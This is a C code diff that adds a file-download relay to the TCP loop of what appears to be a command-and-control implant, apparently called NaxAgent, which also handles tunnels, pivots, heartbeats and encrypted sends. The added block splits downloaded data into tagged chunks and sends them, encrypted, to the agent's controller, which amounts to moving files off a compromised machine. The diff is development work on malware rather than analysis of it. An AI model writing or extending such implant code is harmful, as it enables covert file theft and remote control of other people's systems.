@@ -545,6 +545,36 @@ void nax_tcp_main(NaxAgent *a)
          * Sleep only applies to HTTPS polling mode (handled in https.c). */
         while (a->running) {
 
+            /* Relay download chunks (one chunk per active download per cycle) */
+            /* TCP cap is 256 KB — TCP buffers can't handle 10 MB frames */
+            if (a->download_head) {
+                uint32_t cap = 256 * 1024 + 64;
+                uint8_t *dbuf = (uint8_t *)malloc(cap);
+                if (dbuf) {
+                    uint32_t total = nax_process_downloads(a, dbuf, cap);
+                    /* Parse packed entries: [taskId(4)][dataLen(4)][data] */
+                    uint32_t off = 0;
+                    while (off + 8 <= total) {
+                        uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
+                                      | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
+                        uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
+                                      | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
+                        off += 8;
+                        if (off + dlen > total) break;
+                        uint32_t frame_cap = dlen + 256;
+                        uint8_t *frame = (uint8_t *)malloc(frame_cap);
+                        if (frame) {
+                            uint32_t frame_len = frame_cap;
+                            if (nax_build_result(tid, NAX_STATUS_OK, dbuf + off, dlen, frame, &frame_len) == 0)
+                                send_encrypted(a, frame, frame_len);
+                            free(frame);
+                        }
+                        off += dlen;
+                    }
+                    free(dbuf);
+                }
+            }
+
            /* Process tunnels and pivots before heartbeat */
             relay_tunnels(a);
             process_pivots(a);
